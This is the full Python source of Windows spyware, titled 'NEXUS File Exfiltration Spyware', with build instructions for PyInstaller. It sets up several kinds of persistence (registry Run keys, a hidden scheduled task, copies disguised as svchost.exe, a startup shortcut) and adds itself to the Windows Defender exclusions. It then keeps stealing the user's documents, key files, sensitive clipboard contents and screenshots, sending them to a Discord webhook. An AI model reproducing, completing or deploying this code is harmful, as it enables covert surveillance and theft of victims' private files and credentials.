#!/usr/bin/env python3
"""
███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗███████╗
████╗  ██║██╔════╝██║  ██║██║   ██║██╔════╝██╔════╝
██╔██╗ ██║███████╗███████║██║   ██║███████╗███████╗
██║╚██╗██║╚════██║██╔══██║██║   ██║╚════██║╚════██║
██║ ╚████║███████║██║  ██║╚██████╔╝███████║███████║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
NEXUS File Exfiltration Spyware v2.0 - EXE VERSION
"""

import os
import sys
import json
import base64
import hashlib
import socket
import platform
import subprocess
import threading
import time
import random
import datetime
import urllib.request
import urllib.parse
import ssl
import winreg  # Windows-specific
import ctypes  # Windows-specific

# ============================================================================
# WINDOWS-ONLY CONFIGURATION
# ============================================================================

DISCORD_WEBHOOK_URL = "YOUR DISCORD WEB HOOK HERE"

# Target file extensions
TARGET_EXTENSIONS = [
    '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.zip', '.rar', '.7z',
    '.key', '.pem', '.p12', '.pfx', '.cer', '.crt', '.config', '.ini'
]

# Maximum file size (25MB)
MAX_FILE_SIZE = 25 * 1024 * 1024

# Skip directories (Windows-specific)
SKIP_DIRS = [
    'Windows', 'Program Files', 'Program Files (x86)',
    '$Recycle.Bin', 'System Volume Information', 'AppData',
    'node_modules', '.git', '__pycache__'
]

# ============================================================================
# WINDOWS-SPECIFIC FUNCTIONS
# ============================================================================

def hide_file(filepath):
    """Hide file using Windows attributes"""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(filepath, 2)  # FILE_ATTRIBUTE_HIDDEN
        return True
    except:
        return False

def add_to_windows_defender_exclusions():
    """Try to add self to Windows Defender exclusions"""
    try:
        path = os.path.abspath(sys.argv[0])
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \"{path}\""'
        subprocess.run(cmd, shell=True, capture_output=True)
        return True
    except:
        return False

def create_shortcut_to_startup():
    """Create shortcut in Startup folder (alternative persistence)"""
    try:
        import winshell
        from win32com.client import Dispatch
        
        startup = winshell.startup()
        target = os.path.abspath(sys.argv[0])
        shortcut = os.path.join(startup, "WindowsUpdate.lnk")
        
        shell = Dispatch('WScript.Shell')
        shortcut_obj = shell.CreateShortCut(shortcut)
        shortcut_obj.Targetpath = target
        shortcut_obj.WorkingDirectory = os.path.dirname(target)
        shortcut_obj.save()
        
        hide_file(shortcut)
        return True
    except:
        return False

# ============================================================================
# PERSISTENCE - WINDOWS ONLY
# ============================================================================

class WindowsPersistence:
    """Windows-specific persistence methods"""
    
    @staticmethod
    def install_registry():
        """Install in Windows Registry Run key"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            # Open registry key
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsUpdateManager", 0, winreg.REG_SZ, f'"{script_path}"')
            
            # Also add to RunOnce for redundancy
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, f'"{script_path}"')
            
            return True
        except Exception as e:
            print(f"[ERROR] Registry persistence failed: {e}")
            return False
    
    @staticmethod  
    def install_scheduled_task():
        """Create Windows Scheduled Task"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            
            # XML for scheduled task
            xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{os.environ.get("USERDOMAIN")}\\{os.environ.get("USERNAME")}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{script_path}"</Command>
    </Exec>
  </Actions>
</Task>'''
            
            # Save XML to temp file
            temp_xml = os.path.join(os.environ['TEMP'], 'task.xml')
            with open(temp_xml, 'w', encoding='utf-16') as f:
                f.write(xml)
            
            # Create task
            cmd = f'schtasks /create /tn "Microsoft\\Windows\\DiskCleanup\\SilentCleanup" /xml "{temp_xml}" /f'
            subprocess.run(cmd, shell=True, capture_output=True)
            
            # Clean up
            os.remove(temp_xml)
            return True
            
        except Exception as e:
            print(f"[ERROR] Task scheduler failed: {e}")
            return False
    
    @staticmethod
    def copy_to_system_locations():
        """Copy executable to multiple hidden locations"""
        try:
            current_exe = os.path.abspath(sys.argv[0])
            exe_name = os.path.basename(current_exe)
            
            locations = [
                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', exe_name),
                os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows', 'Explorer', 'explorer_helper.exe'),
                os.path.join(os.environ['TEMP'], 'svchost.exe'),
                os.path.join(os.environ['WINDIR'], 'System32', 'Tasks', 'Microsoft', 'Windows', 'DiskCleanup', 'cleanup.exe')
            ]
            
            for location in locations:
                try:
                    # Create directory if needed
                    os.makedirs(os.path.dirname(location), exist_ok=True)
                    
                    # Copy file
                    import shutil
                    shutil.copy2(current_exe, location)
                    
                    # Hide file
                    hide_file(location)
                    
                    # Update persistence to use this location
                    WindowsPersistence._update_registry_to_location(location)
                    
                except:
                    continue
            
            return True
        except:
            return False
    
    @staticmethod
    def _update_registry_to_location(location):
        """Update registry to point to backup location"""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsUpdateManager", 0, winreg.REG_SZ, f'"{location}"')
            return True
        except:
            return False

# ============================================================================
# MAIN EXECUTION - WINDOWS OPTIMIZED
# ============================================================================

def main():
    """Main function for Windows .exe version"""
    print("[*] NEXUS Windows Service starting...")
    
    # Check if running as .exe
    is_exe = hasattr(sys, 'frozen') or hasattr(sys, '_MEIPASS')
    print(f"[*] Running as executable: {is_exe}")
    
    # Get system info
    system_info = {
        "username": os.environ.get("USERNAME"),
        "computername": os.environ.get("COMPUTERNAME"),
        "domain": os.environ.get("USERDOMAIN"),
        "os": platform.platform(),
        "executable": os.path.abspath(sys.argv[0])
    }
    
    # Send initial beacon
    send_discord_message(f"System: {system_info['computername']}\\{system_info['username']}")
    
    # Install persistence (multiple methods)
    print("[*] Installing persistence...")
    WindowsPersistence.install_registry()
    WindowsPersistence.install_scheduled_task()
    WindowsPersistence.copy_to_system_locations()
    create_shortcut_to_startup()
    
    # Try to add to Defender exclusions
    add_to_windows_defender_exclusions()
    
    # Hide current executable
    hide_file(os.path.abspath(sys.argv[0]))
    
    # Start main surveillance loop
    print("[*] Starting surveillance...")
    surveillance_loop()

def surveillance_loop():
    """Main surveillance loop"""
    while True:
        try:
            # Scan documents every 5 minutes
            scan_documents()
            
            # Check clipboard periodically
            check_clipboard()
            
            # Take occasional screenshot
            if random.random() < 0.1:  # 10% chance
                take_screenshot()
            
            # Sleep before next iteration
            time.sleep(300)  # 5 minutes
            
        except KeyboardInterrupt:
            break
        except:
            continue

def scan_documents():
    """Scan user documents"""
    user_profile = os.environ['USERPROFILE']
    target_folders = [
        os.path.join(user_profile, 'Documents'),
        os.path.join(user_profile, 'Desktop'),
        os.path.join(user_profile, 'Downloads'),
        os.path.join(user_profile, 'Pictures')
    ]
    
    for folder in target_folders:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                        filepath = os.path.join(root, file)
                        if os.path.getsize(filepath) <= MAX_FILE_SIZE:
                            exfiltrate_file(filepath)

def exfiltrate_file(filepath):
    """Send file to Discord"""
    try:
        with open(filepath, 'rb') as f:
            content = f.read()
        
        # Encode and send
        encoded = base64.b64encode(content).decode('utf-8')
        filename = os.path.basename(filepath)
        
        send_discord_message(f"File: {filename}\nSize: {len(content)} bytes\n```{encoded[:1500]}...```")
        
        return True
    except:
        return False

def send_discord_message(content):
    """Send message to Discord webhook"""
    try:
        payload = {
            "content": content,
            "username": "System Monitor"
        }
        
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            DISCORD_WEBHOOK_URL,
            data=data,
            headers={'Content-Type': 'application/json'}
        )
        
        urllib.request.urlopen(req)
        return True
    except:
        return False

def check_clipboard():
    """Check clipboard for sensitive data"""
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        
        # Check for sensitive patterns
        import re
        patterns = [
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
            r'\b\d{3}-\d{2}-\d{4}\b'
        ]
        
        for pattern in patterns:
            if re.search(pattern, str(data)):
                send_discord_message(f"Clipboard contains sensitive data: {data[:100]}...")
                break
                
    except:
        pass

def take_screenshot():
    """Take screenshot"""
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        temp_path = os.path.join(os.environ['TEMP'], 'screenshot.png')
        screenshot.save(temp_path)
        
        with open(temp_path, 'rb') as f:
            content = f.read()
        
        encoded = base64.b64encode(content).decode('utf-8')
        send_discord_message(f"Screenshot:\n```{encoded[:1500]}...```")
        
        os.remove(temp_path)
        return True
    except:
        return False

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    # Check if running as exe
    if hasattr(sys, 'frozen'):
        # Running as compiled exe
        try:
            main()
        except:
            # Silent fail - don't show errors
            pass
    else:
        # Running as Python script
        print("This script is designed to be compiled as Windows executable.")
        print("Use: pyinstaller --onefile --noconsole script.py")